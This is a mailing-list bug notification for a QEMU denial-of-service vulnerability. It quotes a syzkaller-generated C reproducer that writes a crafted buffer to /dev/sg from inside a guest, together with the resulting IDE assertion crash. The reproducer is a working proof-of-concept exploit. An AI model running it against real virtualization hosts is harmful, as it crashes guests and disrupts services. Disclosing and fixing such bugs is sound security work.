Return-Path: <SRS0=msIk=TG=nongnu.org=qemu-devel-bounces+qemu-devel=archiver.kernel.org@kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
X-Spam-Level: 
X-Spam-Status: No, score=-0.9 required=3.0 tests=HEADER_FROM_DIFFERENT_DOMAINS,
	MAILING_LIST_MULTI,SPF_PASS,URIBL_BLOCKED autolearn=ham autolearn_force=no
	version=3.4.0
Received: from mail.kernel.org (mail.kernel.org [198.145.29.99])
	by smtp.lore.kernel.org (Postfix) with ESMTP id 7D927C04A6B
	for <qemu-devel@archiver.kernel.org>; Mon,  6 May 2019 16:38:14 +0000 (UTC)
Received: from lists.gnu.org (lists.gnu.org [209.51.188.17])
	(using TLSv1 with cipher AES256-SHA (256/256 bits))
	(No client certificate requested)
	by mail.kernel.org (Postfix) with ESMTPS id 52A4B20578
	for <qemu-devel@archiver.kernel.org>; Mon,  6 May 2019 16:38:14 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.3.2 mail.kernel.org 52A4B20578
Authentication-Results: mail.kernel.org; dmarc=none (p=none dis=none) header.from=bugs.launchpad.net
Authentication-Results: mail.kernel.org; spf=pass smtp.mailfrom=qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org
Received: from localhost ([127.0.0.1]:59226 helo=lists.gnu.org)
	by lists.gnu.org with esmtp (Exim 4.71)
	(envelope-from <qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org>)
	id 1hNgd3-00084O-GI
	for qemu-devel@archiver.kernel.org; Mon, 06 May 2019 12:38:13 -0400
Received: from eggs.gnu.org ([209.51.188.92]:51215)
	by lists.gnu.org with esmtp (Exim 4.71)
	(envelope-from <bounces@canonical.com>) id 1hNgaq-0006Jr-KY
	for qemu-devel@nongnu.org; Mon, 06 May 2019 12:35:57 -0400
Received: from Debian-exim by eggs.gnu.org with spam-scanned (Exim 4.71)
	(envelope-from <bounces@canonical.com>) id 1hNgao-0001xy-MA
	for qemu-devel@nongnu.org; Mon, 06 May 2019 12:35:56 -0400
Received: from indium.canonical.com ([91.189.90.7]:48304)
	by eggs.gnu.org with esmtps (TLS1.0:RSA_AES_128_CBC_SHA1:16)
	(Exim 4.71) (envelope-from <bounces@canonical.com>)
	id 1hNgam-0001tL-NU
	for qemu-devel@nongnu.org; Mon, 06 May 2019 12:35:54 -0400
Received: from loganberry.canonical.com ([91.189.90.37])
	by indium.canonical.com with esmtp (Exim 4.86_2 #2 (Debian))
	id 1hNgak-0007PX-96
	for <qemu-devel@nongnu.org>; Mon, 06 May 2019 16:35:50 +0000
Received: from loganberry.canonical.com (localhost [127.0.0.1])
	by loganberry.canonical.com (Postfix) with ESMTP id 42CB72E80CB
	for <qemu-devel@nongnu.org>; Mon,  6 May 2019 16:35:50 +0000 (UTC)
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: quoted-printable
Date: Mon, 06 May 2019 16:26:20 -0000
From: Marco Elver <1777315@bugs.launchpad.net>
To: qemu-devel@nongnu.org
X-Launchpad-Notification-Type: bug
X-Launchpad-Bug: product=qemu; status=In Progress; importance=Undecided;
	assignee=jsnow@redhat.com; 
X-Launchpad-Bug-Information-Type: Public Security
X-Launchpad-Bug-Private: no
X-Launchpad-Bug-Security-Vulnerability: yes
X-Launchpad-Bug-Commenters: asurati icytxw melver th-huth
X-Launchpad-Bug-Reporter: icytxw (icytxw)
X-Launchpad-Bug-Modifier: Marco Elver (melver)
References: <152923423559.26799.9467570390321302567.malonedeb@gac.canonical.com>
Message-Id: <155715998043.19694.9552226037364557415.malone@gac.canonical.com>
X-Launchpad-Message-Rationale: Subscriber (QEMU) @qemu-devel-ml
X-Launchpad-Message-For: qemu-devel-ml
Precedence: bulk
X-Generated-By: Launchpad (canonical.com); Revision="18953";
	Instance="launchpad-lazr.conf"
X-Launchpad-Hash: ad7fb41951d78d0ed0158237e4ec1f509a67dc7d
X-detected-operating-system: by eggs.gnu.org: GNU/Linux 2.2.x-3.x [generic]
X-Received-From: 91.189.90.7
Subject: [Qemu-devel] [Bug 1777315] Re: Denial of service
X-BeenThere: qemu-devel@nongnu.org
X-Mailman-Version: 2.1.21
List-Id: <qemu-devel.nongnu.org>
List-Unsubscribe: <https://lists.nongnu.org/mailman/options/qemu-devel>,
	<mailto:qemu-devel-request@nongnu.org?subject=unsubscribe>
List-Archive: <http://lists.nongnu.org/archive/html/qemu-devel/>
List-Post: <mailto:qemu-devel@nongnu.org>
List-Help: <mailto:qemu-devel-request@nongnu.org?subject=help>
List-Subscribe: <https://lists.nongnu.org/mailman/listinfo/qemu-devel>,
	<mailto:qemu-devel-request@nongnu.org?subject=subscribe>
Reply-To: Bug 1777315 <1777315@bugs.launchpad.net>
Errors-To: qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org
Sender: "Qemu-devel"
	<qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org>

FYI: we've hit this as will with syzkaller testing; this is still
reproducible as-is with latest qemu (commit a6ae238), and the latest
Linux kernel (5.1-rc7).

-- =

You received this bug notification because you are a member of qemu-
devel-ml, which is subscribed to QEMU.
https://bugs.launchpad.net/bugs/1777315

Title:
  Denial of service

Status in QEMU:
  In Progress

Bug description:
  Hi,
  QEMU 'hw/ide/core.c:871' Denial of Service Vulnerability in version qemu-=
2.12.0

  run the program in qemu-2.12.0:
  #define _GNU_SOURCE =

  #include <endian.h>
  #include <sys/syscall.h>
  #include <unistd.h>
  #include <fcntl.h>
  #include <stdio.h>
  #include <string.h>
  #include <sys/stat.h>
  #include <stdint.h>
  #include <string.h>

  static uintptr_t syz_open_dev(uintptr_t a0, uintptr_t a1, uintptr_t a2)
  {
          if (a0 =3D=3D 0xc || a0 =3D=3D 0xb) {
                  char buf[128];
                  sprintf(buf, "/dev/%s/%d:%d", a0 =3D=3D 0xc ? "char" : "b=
lock", (uint8_t)a1, (uint8_t)a2);
                  return open(buf, O_RDWR, 0);
          } else {
                  char buf[1024];
                  char* hash;
  strncpy(buf, (char*)a0, sizeof(buf) - 1);
                  buf[sizeof(buf) - 1] =3D 0;
                  while ((hash =3D strchr(buf, '#'))) {
                          *hash =3D '0' + (char)(a1 % 10);
                          a1 /=3D 10;
                  }
                  return open(buf, a2, 0);
          }
  }

  uint64_t r[2] =3D {0xffffffffffffffff, 0xffffffffffffffff};
  void loop()
  {
          long res =3D 0;
  memcpy((void*)0x20000000, "/dev/sg#", 9);
          res =3D syz_open_dev(0x20000000, 0, 2);
          if (res !=3D -1)
                  r[0] =3D res;
          res =3D syscall(__NR_dup2, r[0], r[0]);
          if (res !=3D -1)
                  r[1] =3D res;
  *(uint8_t*)0x20000ec0 =3D 0;
  *(uint8_t*)0x20000ec1 =3D 0;
  *(uint8_t*)0x20000ec2 =3D 0;
  *(uint8_t*)0x20000ec3 =3D 0;
  *(uint32_t*)0x20000ec8 =3D 0;
  *(uint8_t*)0x20000ed8 =3D 0;
  *(uint8_t*)0x20000ed9 =3D 0;
  *(uint8_t*)0x20000eda =3D 0;
  *(uint8_t*)0x20000edb =3D 0;
  memcpy((void*)0x20000ee0, "\x9c\x4d\xe7\xd5\x0a\x62\x43\xa7\x77\x53\x67\x=
b3", 12);
          syscall(__NR_write, r[1], 0x20000ec0, 0x323);
  }

  int main()
  {
          syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
          loop();
          return 0;
  }
  this will crash qemu, output information:
   qemu-system-x86_64: hw/ide/core.c:843: ide_dma_cb: Assertion `n * 512 =
=3D=3D s->sg.size' failed.

  =

  Thanks =

  owl337

To manage notifications about this bug go to:
https://bugs.launchpad.net/qemu/+bug/1777315/+subscriptions

